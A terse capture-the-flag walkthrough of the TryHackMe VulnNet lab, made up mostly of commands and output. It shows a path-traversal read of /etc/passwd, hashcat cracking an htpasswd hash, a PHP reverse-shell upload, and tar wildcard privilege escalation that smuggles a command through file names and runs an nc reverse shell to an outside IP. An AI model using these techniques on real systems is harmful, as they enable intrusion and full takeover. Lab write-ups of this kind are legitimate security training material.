<code>

  ## VulnNet
  
LINK : https://tryhackme.com/room/vulnnet1


GET http://vulnnet.thm/index.php?referer=//etc/passwd HTTP/1.1

Looking at the above screenshot we see that the credential for the broadcast.vulnnet.thm is stored in

/etc/apache2/.htpasswd


 developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0

D:\__Instal\____tryhackme_tools\hashcat-6.2.6>hashcat.exe -m 1600 hash2.txt rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) UHD Graphics 630, 6432/12965 MB (2047 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1475 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
Time.Started.....: Mon Jun 02 12:51:22 2025 (9 mins, 44 secs)
Time.Estimated...: Mon Jun 02 13:01:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3749 H/s (17.72ms) @ Accel:4 Loops:3 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2187264/14344385 (15.25%)
Rejected.........: 0/2187264 (0.00%)
Restore.Point....: 2162688/14344385 (15.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:999-1000
Candidate.Engine.: Device Generator
Candidates.#1....: Angelica6 -> 8891137

Started: Mon Jun 02 12:51:02 2025
Stopped: Mon Jun 02 13:01:08 2025

## $apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls

## reverse shell
─$ curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:9972761drmfsls
{"success":"yes","file_name":"17488640255add7e","extension":"php","file_directory":"2025\/06\/02"}                                                                                                                     

## GET user access

┌──(kali㉿kali)-[~/Documents/THM/THM_VulnNet]
└─$ chmod 600 id_rsa    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/THM/THM_VulnNet]
└─$ ssh  -i id_rsa server-management@vulnnet.thm
Enter passphrase for key 'id_rsa': oneTWO3gOyac

## Found this in crontab
server-management@vulnnet:/$ cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

## Linux Privilege Escalation Using tar Wildcards
server-management@vulnnet:/$ cd ./home/server-management/Documents/
server-management@vulnnet:~/Documents$ ls
'Daily Job Progress Report Format.pdf'  'Employee Search Progress Report.pdf'
server-management@vulnnet:~/Documents$ echo "mkfifo /tmp/lhennp; nc 10.8.28.108 9001 0</tmp/lhennp | /bin/sh > /tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
server-management@vulnnet:~/Documents$ cat shell.sh 
mkfifo /tmp/lhennp; nc 10.8.28.108 9001 0</tmp/lhennp | /bin/sh > /tmp/lhennp 2>&1; rm /tmp/lhennp
server-management@vulnnet:~/Documents$ touch ./--checkpoint=1
server-management@vulnnet:~/Documents$ touch ./--checkpoint-action=exec=sh\ shell.sh
server-management@vulnnet:~/Documents$ chmod +x shell.sh 
server-management@vulnnet:~/Documents$ ls -la
total 84
drwxr-xr-x  2 server-management server-management  4096 Jun  5 12:04  .
drwxrw---- 18 server-management server-management  4096 Jan 24  2021  ..
-rw-rw-r--  1 server-management server-management     0 Jun  5 12:04 '--checkpoint=1'
-rw-rw-r--  1 server-management server-management     0 Jun  5 12:04 '--checkpoint-action=exec=sh shell.sh'
-rw-r-----  1 server-management server-management 35144 Jan 23  2021 'Daily Job Progress Report Format.pdf'
-rw-r-----  1 server-management server-management 33612 Jan 23  2021 'Employee Search Progress Report.pdf'
-rwxrwxr-x  1 server-management server-management    42 Jun  5 12:03  shell.sh
server-management@vulnnet:~/Documents$ 





</code>
